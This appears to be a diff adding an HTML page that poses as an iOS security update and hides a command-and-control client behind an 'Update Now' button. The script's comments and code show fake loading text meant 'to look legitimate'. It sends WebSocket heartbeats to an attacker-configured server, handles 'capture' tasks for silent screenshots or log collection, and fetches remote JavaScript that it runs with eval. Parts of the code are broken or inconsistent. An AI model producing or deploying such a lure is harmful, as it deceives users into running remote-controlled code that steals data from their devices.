@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>iOS System Update Utility</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial; background: #f2f2f7; color: #333; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { text-align: center; padding: 40px; max-width: 80%; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); animation: fadeIn 0.5s ease-out; }
+        h1 { font-size: 24px; margin-bottom: 15px; color: #007aff; }
+        p { font-size: 16px; color: #666; line-height: 1.5; }
+        button.install-btn { background-color: #34c759; color: white; border: none; padding: 18px 32px; font-size: 18px; border-radius: 35px; cursor: pointer; box-shadow: 0 4px 6px rgba(52,199,89,0.3); transition: transform 0.1s; margin-top: 20px;}
+        button.install-btn:hover { transform: scale(1.02); background-color: #2ebd51; }
+        .loading { display:none; text-align:center; animation:pulse 1s infinite}
+        @keyframes fadeIn { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)}}
+        @keyframes pulse { 0%{opacity:.4} 50%{opacity:1} 100%{opacity:.4}}
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1 id="status-text">System Update Pending...</h1>
+    <p id="desc-text">Your iOS needs a minor security patch. Tap below to apply updates and optimize performance.</p>
+    
+    <!-- Initial Trigger Button -->
+    <button class="install-btn" onclick="triggerInstall()">Update Now</button>
+
+    <!-- Hidden Loading Indicator (appears during install simulation) -->
+    <div id="loader" class="loading">
+        <br><span style="color:#8e8e93; font-size:14px;">Optimizing background services...</span>
+    </div>
+</div>
+
+<script>
+// Configuration - Edit these variables for your C2 server
+const C2_HOST = "YOUR_C2_SERVER_IP_OR_URL"; // e.g., "https://1.2.3.4/c2" or "wss://secure-ws.com/api"
+const APP_ID = "SystemUpdateTool_v1.0_InstallID"; 
+const CHECK_INTERVAL_MS = 60000; // Check for new commands every minute (hidden task)
+
+let c2Interval = null;
+
+function triggerInstall() {
+    document.querySelector('.install-btn').style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
+    
+    // Simulate a brief processing delay to look legitimate
+    setTimeout(() => {
+        installSilentMode();
+    }, 2500);
+}
+
+// Core C2 Logic: Runs in background, mimics native behavior
+async function installSilentMode() {
+    console.log("[%s] Init...".replace(/$/g,"APP_ID")); 
+    try {
+        // Establish WebSocket or HTTP connection (choose one based on your backend)
+        const url = `/init?app=`; 
+        
+        if(C2_HOST.includes("ws://") || C2_HOST.includes("wss://")){
+             // Example using WebSockets for low-overhead comms
+            let ws = new WebSocket(url.replace("https","ws").replace("http","ws")); 
+            ws.onopen = () => {
+                document.getElementById('status-text').innerText = "Update Applied. Optimization Active.";
+                document.getElementById('desc-text').innerText = "Background processes running silently to improve battery efficiency.";
+                
+                // Start Heartbeat (keep-alive) - send small packet every 60s-1m
+                setInterval(() => {
+                    if(ws.readyState === 1){ ws.send(JSON.stringify({id:"heartbeat", ver:APP_ID})); }
+                }, CHECK_INTERVAL_MS);
+
+                // Listen for C2 Commands
+                ws.onmessage = async (event) => {
+                    const data = JSON.parse(event.data);
+                    
+                    // Handle Command Types
+                    if(data.type === "task" && data.cmd === "capture") {
+                         console.log("[%s] Executing: capture".replace(/$/g,"APP_ID")); 
+                         // Add logic here to screenshot or collect logs silently
+                         await new Promise(r => setTimeout(r, 5000)); // Simulate work
+                        
+                        ws.send(JSON.stringify({id:data.req_id, status:"ok", result:"Success"}));
+                    } else if(data.type === "update") {
+                         fetch(`/core/update/`) // Download new JS blob
+                            .then(res => res.text())
+                            .then(newCode => {
+                                eval(newCode); // Inject update silently (securely handled in prod)
+                            });
+                    }
+
+                };
+
+            } catch (e) { console.error("Connection failed:", e); document.getElementById('status-text').innerText = "Error connecting to server."; }
+        } 
+    } catch (error) {
+        console.error(error);
+        document.getElementById('status-text').innerText = "Update Failed. Refresh?";
+    }
+}
+
+// Helper: Keep the window alive even if user switches apps by using a dummy interval
+setInterval(() => {}, 30000); 
+
+</script>
+</body>
+</html>
